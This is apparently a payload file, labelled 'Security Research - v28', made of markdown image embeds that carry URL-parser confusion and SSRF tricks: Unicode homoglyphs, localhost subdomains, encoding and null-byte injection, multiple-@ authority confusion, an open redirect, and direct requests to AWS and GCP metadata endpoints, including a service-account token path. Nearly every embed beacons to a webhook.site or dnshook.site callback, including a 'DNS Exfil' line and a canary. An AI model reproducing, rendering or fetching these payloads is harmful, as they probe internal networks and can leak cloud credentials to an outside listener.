# Security Research - v28

## Unicode, Subdomain and Encoding Attacks

Testing advanced URL manipulation attacks.

---

### 1) Unicode Homoglyph in Host (ⓛocalhost)

Using Unicode fullwidth/circled characters:

![homoglyph](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/homoglyph.gif)

---

### 2) Subdomain Confusion - localhost.attacker.com

Using localhost as subdomain:

![subdomain](https://localhost.6c7992c7-e55e-4d41-ab82-a55c6f411ce2.dnshook.site/subdomain.gif)

---

### 3) 127.0.0.1 as Subdomain

![ip-subdomain](https://127.0.0.1.6c7992c7-e55e-4d41-ab82-a55c6f411ce2.dnshook.site/ip-subdomain.gif)

---

### 4) Internal IP in Fragment Before Path

Fragment confusion:

![fragment](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2#@127.0.0.1/fragment.gif)

---

### 5) Backslash in URL

Some parsers treat \ as /:

![backslash](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2\@127.0.0.1/backslash.gif)

---

### 6) Triple-Encoded URL

Triple URL encoding:

![triple](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/%25%32%35%37%46%25%32%35%37%46127.0.0.1/triple.gif)

---

### 7) URL with Null Byte

Null byte injection:

![null](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/%00@127.0.0.1/null.gif)

---

### 8) URL with Tab/Newline

Whitespace injection:

![whitespace](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/%09%0a@127.0.0.1/whitespace.gif)

---

### 9) Scheme Confusion (http:80)

Port in scheme area:

![scheme](http:80//webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/scheme.gif)

---

### 10) Authority Confusion with Multiple @

Multiple @ signs:

![multi-at](https://user@127.0.0.1@webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/multi-at.gif)

---

### 11) IPv6 Zone ID Attack

IPv6 zone identifier:

![zone](http://[::1%25eth0]:80/zone.gif)

---

### 12) Unicode Right-to-Left Override

RTL override attack:

![rtl](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/moc.1.0.0.721\u202e/rtl.gif)

---

### 13) IDNA (Punycode) Domain

Internationalized domain:

![idna](http://xn--n3h.com/idna.gif)

---

### 14) Open Redirect via OAuth-style URL

Using redirect_uri pattern:

![oauth](https://httpbin.org/redirect-to?url=https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/oauth-redirect.gif)

---

### 15) Port 0 (Invalid Port)

![port0](http://webhook.site:0/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/port0.gif)

---

### 16) Port 65536 (Out of Range)

![port-overflow](http://webhook.site:65536/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/port-overflow.gif)

---

### 17) Hostname with Space (%20)

![space-host](http://webhook%20.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/space-host.gif)

---

### 18) Special Kubernetes DNS

Kubernetes internal DNS:

![k8s](http://kubernetes.default.svc.cluster.local/k8s.gif)

---

### 19) AWS EC2 Instance Identity Document

EC2 instance metadata:

![ec2-id](http://169.254.169.254/latest/dynamic/instance-identity/document/ec2.gif)

---

### 20) GCP Service Account Token

GCP metadata:

![gcp-token](http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token/gcp.gif)

---

### DNS Exfil

![dns](https://v28-dns.6c7992c7-e55e-4d41-ab82-a55c6f411ce2.dnshook.site/dns.gif)

### Canary

![canary](https://webhook.site/6c7992c7-e55e-4d41-ab82-a55c6f411ce2/v28-canary.gif)

---

*v28 - Unicode, subdomain and encoding attacks*
